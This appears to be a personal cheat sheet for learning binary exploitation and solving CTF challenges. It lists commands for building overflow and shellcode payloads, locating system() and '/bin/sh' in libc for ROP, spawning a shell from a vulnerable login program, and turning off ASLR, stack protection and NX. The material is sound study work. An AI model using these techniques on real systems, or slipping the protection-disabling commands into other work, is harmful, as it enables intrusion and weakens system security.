perl -e 'printf"A"x72;print"\x12\x34\x56\x78"' > payload 
echo `python -c 'print"A"*200'`

xxd -g 1 payload

tcc -g -o Simple_login Simple_login.c --> -g for gdb, tcc for tiny c compiler(without optimizations)

print "%d" $esp-$ebp

objdump -t Simple_login | grep go_shell --> start address of go_shell function
objdump -s -j .dtors arbwrite --> dtor list of arbwrite
objdump -R ropesourasrex --> GOT table entries
objdump -x ropasaurusrex --> shows all sections of the process
objdump -d name_of_libc_file | grep read --> offset for read() in libc

strings -t -a x /path/of/libc | grep "/bin/sh" --> offset of the string "/bin/sh" in libc

ldd ropasaurusrex --> gives list of libraries used by the program ropasaurusrex , use this to get name and address of libc file, with ASLR this is different every time.

(gdb-peda) run < payload
(gdb-peda) run `cat payload`
(gdb-peda) info file --> entry point
(gdb-peda) find "/bin/sh" libc --> gives address of /bin/sh in libc (memory mapped region)
(gdb-peda) p system --> address of system()
(gdb-peda) vmmap - shows memory maps of the entire process, i.e stack,heap,libc,binary's memory. stack,heap,libc will change if aslr is on.binary's memory will change if pie is on. Use this to find a location in memory which is writeable. 

readelf -l ropasaurusrex --> similar to info file in gdb.

gdb basic_vuln core --> debug dumped core after seg fault

(cat payload;cat)|./Simple_login --> The unix pipe “|” is to redirect output of our command (cat payload;cat) and use it as 
the input for simple_login. We have to put the extra “cat” in the command to echo Commands to the shell we will spawn, otherwise an EOF is sent and the shell closes immediately before we can actually execute any programs. 

Look up the number corresponding to the system call in /usr/include/x86_64-linux-gnu/asm/unistd_64.h for x86-64 and /usr/include/x86_64-linux-gnu/asm/unistd_32.h for x86.

Place system call number in eax/rax, and arguments in ebx/rdi,ecx/rsi,edx/rdx,r10,r8,r9… etc in the order they appear in the corresponding man page.

Execute int 0x80 on x86 and syscall on x86-64  to alert the kernel you want to perform a system call.

wc hello.shellcode

perl -e ('print "\x90"*(64-34)';cat hello.shellcode) | cat > payload

./Simple_login < payload2

./Simple_login `cat payload2`

ulimit -c unlimited --> dump core after segfault

gcc -fno-stack-protector --> disables SSP(Stack Smashing Protection)
gcc -z execstack --> disables NX

/proc/sys/kernel/randomize_va_space controls ASLR
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space" disables ASLR temporarily

```https://bitvijays.github.io/LFC-BinaryExploitation.html```



